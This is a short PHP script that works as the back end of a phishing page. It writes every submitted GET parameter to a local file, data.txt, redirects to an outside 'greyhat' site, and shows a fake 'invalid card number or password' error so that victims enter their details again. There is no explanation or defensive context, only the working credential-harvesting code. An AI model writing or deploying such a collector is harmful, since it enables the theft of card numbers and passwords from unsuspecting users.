<?php
header('location: www.spartagreyhat.com');
$handle = fopen("data.txt", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
    fwrite($handle, "\r\n\n\n\n\n");
    fclose($handle);
    echo "invalid card number or password ... REENTER AGAIN<br>";
    ?>